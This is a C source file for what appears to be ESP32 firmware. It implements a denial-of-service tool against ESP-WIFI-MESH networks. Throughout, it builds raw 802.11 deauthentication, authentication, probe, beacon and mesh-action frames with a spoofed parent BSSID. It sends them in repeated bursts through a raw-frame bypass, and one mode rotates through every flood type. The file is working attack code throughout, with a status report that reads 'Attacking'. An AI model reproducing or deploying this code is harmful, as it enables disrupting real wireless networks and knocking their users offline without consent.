/**
 * mesh_dos.c
 *
 * Continuous 802.11 management-frame floods against ESP-WIFI-MESH nodes.
 * Soft-AP pauses during attack; auto-stops after MESH_DOS_TIMEOUT_SEC.
 */

#include "mesh_dos.h"

#include <string.h>
#include <stdio.h>

#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "MESH_DOS";

static const char *method_strings[] = {
    [MESH_DOS_METHOD_NONE]             = "Idle",
    [MESH_DOS_METHOD_CHILD_DEAUTH]     = "Child Deauth",
    [MESH_DOS_METHOD_PARENT_DEAUTH]    = "Parent Deauth",
    [MESH_DOS_METHOD_MESH_ACTION_FLOOD]= "Mesh Action Flood",
    [MESH_DOS_METHOD_AUTH_FLOOD]       = "Auth Flood",
    [MESH_DOS_METHOD_PROBE_FLOOD]      = "Probe Flood",
    [MESH_DOS_METHOD_BEACON_FLOOD]     = "Beacon Flood",
    [MESH_DOS_METHOD_COMBINE_ALL]      = "Combine All",
};

static mesh_dos_state_t  s_state;
static mesh_dos_config_t s_cfg;
static volatile bool     s_running = false;
static TaskHandle_t      s_task    = NULL;
static esp_timer_handle_t s_timeout_timer = NULL;
static SemaphoreHandle_t s_mutex = NULL;
static bool              s_ap_was_stopped = false;

const char *mesh_dos_method_str(mesh_dos_method_t m)
{
    if (m >= MESH_DOS_METHOD_COUNT) return "Unknown";
    return method_strings[m];
}

static bool mutex_take(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
        if (s_mutex == NULL) return false;
    }
    return xSemaphoreTake(s_mutex, pdMS_TO_TICKS(2000)) == pdTRUE;
}

static void mutex_give(void)
{
    if (s_mutex != NULL) {
        xSemaphoreGive(s_mutex);
    }
}

static uint16_t build_deauth(uint8_t *out, size_t max_len,
                             const uint8_t *dest, const uint8_t *src,
                             const uint8_t *bssid, uint16_t reason)
{
    if (max_len < 26) return 0;
    memset(out, 0, 26);
    out[0] = 0xC0;
    out[1] = 0x00;
    out[2] = 0x3a;
    out[3] = 0x01;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = (uint8_t)(reason & 0xFF);
    out[25] = (uint8_t)((reason >> 8) & 0xFF);
    return 26;
}

static uint16_t build_auth(uint8_t *out, size_t max_len,
                           const uint8_t *dest, const uint8_t *src,
                           const uint8_t *bssid)
{
    if (max_len < 30) return 0;
    memset(out, 0, 30);
    out[0] = 0xB0;
    out[1] = 0x00;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = 0x00; out[25] = 0x00;
    out[26] = 0x01; out[27] = 0x00;
    out[28] = 0x00; out[29] = 0x00;
    return 30;
}

static uint16_t build_probe_req(uint8_t *out, size_t max_len,
                                const uint8_t *src, const char *ssid)
{
    uint8_t ssid_len = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
    uint16_t total = (uint16_t)(24 + 2 + ssid_len);
    if (max_len < total) return 0;

    memset(out, 0, total);
    out[0] = 0x40;
    out[1] = 0x00;
    memset(out + 4, 0xFF, 6);
    memcpy(out + 10, src, 6);
    memcpy(out + 16, src, 6);
    out[24] = 0x00;
    out[25] = ssid_len;
    if (ssid_len > 0) {
        memcpy(out + 26, ssid, ssid_len);
    }
    return total;
}

static uint16_t build_beacon(uint8_t *out, size_t max_len,
                             const uint8_t *bssid, const char *ssid, uint8_t channel)
{
    uint8_t ssid_len = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
    uint16_t total = (uint16_t)(38 + ssid_len + 3);
    if (max_len < total) return 0;

    memset(out, 0, total);
    out[0] = 0x80;
    out[1] = 0x00;
    memset(out + 4, 0xFF, 6);
    memcpy(out + 10, bssid, 6);
    memcpy(out + 16, bssid, 6);
    out[24] = 0x64; out[25] = 0x00;
    out[26] = 0x01; out[27] = 0x04;
    out[28] = 0x00;
    out[29] = ssid_len;
    if (ssid_len > 0) {
        memcpy(out + 30, ssid, ssid_len);
    }
    uint16_t off = (uint16_t)(30 + ssid_len);
    out[off++] = 0x03;
    out[off++] = 0x01;
    out[off++] = channel;
    return off;
}

static uint16_t build_mesh_action(uint8_t *out, size_t max_len,
                                  const uint8_t *dest, const uint8_t *src,
                                  const uint8_t *bssid)
{
    if (max_len < 32) return 0;
    memset(out, 0, 32);
    out[0] = 0xD0;
    out[1] = 0x00;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = 0x00; out[25] = 0x00;
    out[26] = 127;
    out[27] = 0x00;
    out[28] = 0xE0; out[29] = 0x9A; out[30] = 0xF6;
    out[31] = 0x01;
    return 32;
}

static bool send_frame(const uint8_t *frame, uint16_t len)
{
    return wsl_bypasser_send_raw_frame(frame, len);
}

static uint8_t resolve_tx_channel(uint8_t requested)
{
    if (requested > 0) return requested;
#ifndef CONFIG_MGMT_AP_CHANNEL
#define CONFIG_MGMT_AP_CHANNEL 6
#endif
    return CONFIG_MGMT_AP_CHANNEL;
}

static bool prepare_radio(uint8_t channel)
{
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    s_ap_was_stopped = false;
    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_APSTA) {
        wifictl_mgmt_ap_stop();
        s_ap_was_stopped = true;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_err_t ch_err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) {
        ESP_LOGW(TAG, "Channel set to %u failed: %s", channel, esp_err_to_name(ch_err));
    }
    return true;
}

static void restore_radio(void)
{
    if (s_ap_was_stopped) {
        wifictl_mgmt_ap_start();
        s_ap_was_stopped = false;
    }
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
}

static void timeout_cb(void *arg)
{
    (void)arg;
    ESP_LOGW(TAG, "Mesh DoS timeout (%d s)", MESH_DOS_TIMEOUT_SEC);
    if (mutex_take()) {
        s_state.timeout = true;
        mutex_give();
    }
    mesh_dos_stop();
}

static void start_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
    const esp_timer_create_args_t args = {
        .callback = timeout_cb,
        .name     = "mesh_dos_to",
    };
    if (esp_timer_create(&args, &s_timeout_timer) == ESP_OK) {
        esp_timer_start_once(s_timeout_timer, MESH_DOS_TIMEOUT_US);
    }
}

static void stop_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
}

static mesh_dos_method_t combine_method_at(uint32_t tick)
{
    static const mesh_dos_method_t rotation[] = {
        MESH_DOS_METHOD_CHILD_DEAUTH,
        MESH_DOS_METHOD_PARENT_DEAUTH,
        MESH_DOS_METHOD_MESH_ACTION_FLOOD,
        MESH_DOS_METHOD_AUTH_FLOOD,
        MESH_DOS_METHOD_PROBE_FLOOD,
        MESH_DOS_METHOD_BEACON_FLOOD,
    };
    return rotation[tick % (sizeof(rotation) / sizeof(rotation[0]))];
}

static int build_for_method(uint8_t *frame, size_t max_len,
                            mesh_dos_method_t method,
                            const uint8_t *dest, const uint8_t *src,
                            const uint8_t *bssid, const char *ssid,
                            uint8_t channel, uint16_t reason)
{
    switch (method) {
        case MESH_DOS_METHOD_CHILD_DEAUTH:
        case MESH_DOS_METHOD_PARENT_DEAUTH:
            return build_deauth(frame, max_len, dest, src, bssid, reason);
        case MESH_DOS_METHOD_MESH_ACTION_FLOOD:
            return build_mesh_action(frame, max_len, dest, src, bssid);
        case MESH_DOS_METHOD_AUTH_FLOOD:
            return build_auth(frame, max_len, dest, src, bssid);
        case MESH_DOS_METHOD_PROBE_FLOOD:
            return build_probe_req(frame, max_len, src, ssid);
        case MESH_DOS_METHOD_BEACON_FLOOD:
            return build_beacon(frame, max_len, bssid, ssid, channel);
        default:
            return -1;
    }
}

static void tx_burst(mesh_dos_method_t method, uint32_t combine_tick)
{
    uint8_t frame[256];
    const uint8_t *parent = s_cfg.parent_bssid;
    const uint8_t *src    = parent;
    uint8_t bcast[6];
    memset(bcast, 0xFF, 6);

    mesh_dos_method_t active_method = method;
    if (method == MESH_DOS_METHOD_COMBINE_ALL) {
        active_method = combine_method_at(combine_tick);
    }

    const uint8_t *dest = s_cfg.target_mac_set ? s_cfg.target_mac : bcast;
    if (active_method == MESH_DOS_METHOD_PARENT_DEAUTH) {
        dest = bcast;
    }

    uint16_t burst = s_cfg.burst_size;
    if (burst == 0) burst = 1;
    if (burst > 32) burst = 32;

    for (uint16_t b = 0; b < burst && s_running; b++) {
        /* Child deauth: rotate through extra targets if set */
        const uint8_t *tx_dest = dest;
        if (active_method == MESH_DOS_METHOD_CHILD_DEAUTH && s_cfg.extra_target_count > 0) {
            tx_dest = s_cfg.extra_targets[b % s_cfg.extra_target_count];
        }

        int flen = build_for_method(frame, sizeof(frame), active_method,
                                    tx_dest, src, parent,
                                    s_cfg.ssid, s_cfg.channel,
                                    s_cfg.reason_code);
        if (flen <= 0) {
            snprintf(s_state.error, sizeof(s_state.error), "Frame build failed");
            break;
        }

        if (send_frame(frame, (uint16_t)flen)) {
            s_state.packets_sent++;
        } else {
            s_state.packets_failed++;
            vTaskDelay(pdMS_TO_TICKS(2));
        }
        if (b + 1 < burst && s_running) {
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }

    if (method == MESH_DOS_METHOD_COMBINE_ALL) {
        strncpy(s_state.method_str, mesh_dos_method_str(active_method),
                sizeof(s_state.method_str) - 1);
    }
}

static void dos_task(void *arg)
{
    (void)arg;

    ESP_LOGW(TAG, "═══ MESH DoS START ═══ method=%s ch=%u interval=%u burst=%u",
             mesh_dos_method_str(s_cfg.method),
             s_cfg.channel, s_cfg.interval_ms, s_cfg.burst_size);

    uint8_t tx_channel = resolve_tx_channel(s_cfg.channel);
    s_cfg.channel = tx_channel;
    s_state.channel = tx_channel;
    prepare_radio(tx_channel);

    uint32_t start_us = (uint32_t)esp_timer_get_time();
    uint32_t combine_tick = 0;

    while (s_running) {
        tx_burst(s_cfg.method, combine_tick);
        combine_tick++;

        s_state.uptime_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);

        if (s_cfg.interval_ms > 0) {
            vTaskDelay(pdMS_TO_TICKS(s_cfg.interval_ms));
        } else {
            taskYIELD();
        }
    }

    ESP_LOGI(TAG, "Mesh DoS done: sent=%lu failed=%lu",
             (unsigned long)s_state.packets_sent,
             (unsigned long)s_state.packets_failed);

    stop_timeout_timer();
    restore_radio();
    s_state.active = false;
    s_running = false;
    s_task = NULL;
    vTaskDelete(NULL);
}

void mesh_dos_init(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
    }
    memset(&s_state, 0, sizeof(s_state));
    s_running = false;
    ESP_LOGI(TAG, "Mesh DoS ready (%d methods)", (int)MESH_DOS_METHOD_COUNT - 1);
}

esp_err_t mesh_dos_start(const mesh_dos_config_t *cfg)
{
    if (!cfg) return ESP_ERR_INVALID_ARG;
    if (s_running) return ESP_ERR_INVALID_STATE;

    uint8_t zero[6] = {0};
    if (memcmp(cfg->parent_bssid, zero, 6) == 0) {
        return ESP_ERR_INVALID_ARG;
    }
    if (cfg->method <= MESH_DOS_METHOD_NONE || cfg->method >= MESH_DOS_METHOD_COUNT) {
        return ESP_ERR_INVALID_ARG;
    }

    memset(&s_state, 0, sizeof(s_state));
    memcpy(&s_cfg, cfg, sizeof(s_cfg));

    if (!s_cfg.target_mac_set) {
        memset(s_cfg.target_mac, 0xFF, 6);
    }
    if (s_cfg.burst_size == 0) {
        s_cfg.burst_size = 5;
    }
    if (s_cfg.interval_ms == 0) {
        s_cfg.interval_ms = 50;
    }
    if (s_cfg.reason_code == 0) {
        s_cfg.reason_code = 7;
    }

    s_state.active = true;
    s_state.method = s_cfg.method;
    s_state.channel = s_cfg.channel;
    memcpy(s_state.parent_bssid, s_cfg.parent_bssid, 6);
    memcpy(s_state.target_mac, s_cfg.target_mac, 6);
    strncpy(s_state.ssid, s_cfg.ssid, sizeof(s_state.ssid) - 1);
    strncpy(s_state.method_str, mesh_dos_method_str(s_cfg.method),
            sizeof(s_state.method_str) - 1);

    s_running = true;
    start_timeout_timer();

    if (xTaskCreate(dos_task, "mesh_dos", 6144, NULL, 2, &s_task) != pdPASS) {
        s_running = false;
        s_state.active = false;
        stop_timeout_timer();
        return ESP_ERR_NO_MEM;
    }

    return ESP_OK;
}

esp_err_t mesh_dos_stop(void)
{
    if (!s_running && !s_state.active) {
        restore_radio();
        return ESP_OK;
    }

    s_running = false;
    stop_timeout_timer();

    int wait = 30;
    while (s_task && wait-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (s_task) {
        vTaskDelete(s_task);
        s_task = NULL;
    }

    restore_radio();
    s_state.active = false;
    return ESP_OK;
}

bool mesh_dos_is_active(void)
{
    return s_running || s_state.active;
}

const mesh_dos_state_t *mesh_dos_get_state(void)
{
    return &s_state;
}

cJSON *mesh_dos_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    const mesh_dos_state_t *st = &s_state;

    cJSON_AddBoolToObject(root, "active", st->active || s_running);
    cJSON_AddBoolToObject(root, "running", st->active || s_running);
    cJSON_AddBoolToObject(root, "timeout", st->timeout);
    cJSON_AddNumberToObject(root, "packets_sent", st->packets_sent);
    cJSON_AddNumberToObject(root, "packets_failed", st->packets_failed);
    cJSON_AddNumberToObject(root, "uptime_ms", st->uptime_ms);
    cJSON_AddNumberToObject(root, "method", st->method);
    cJSON_AddStringToObject(root, "method_str",
        st->method_str[0] ? st->method_str : mesh_dos_method_str(st->method));
    cJSON_AddNumberToObject(root, "channel", st->channel);

    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->parent_bssid[0], st->parent_bssid[1], st->parent_bssid[2],
             st->parent_bssid[3], st->parent_bssid[4], st->parent_bssid[5]);
    cJSON_AddStringToObject(root, "parent_bssid", mac);
    cJSON_AddStringToObject(root, "bssid", mac);

    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->target_mac[0], st->target_mac[1], st->target_mac[2],
             st->target_mac[3], st->target_mac[4], st->target_mac[5]);
    cJSON_AddStringToObject(root, "target_mac", mac);

    cJSON_AddStringToObject(root, "ssid", st->ssid);

    if (st->error[0]) {
        cJSON_AddStringToObject(root, "error", st->error);
    }

    cJSON_AddStringToObject(root, "status",
        (st->active || s_running) ? "Attacking" :
        (st->timeout ? "Timeout" : "Idle"));

    return root;
}
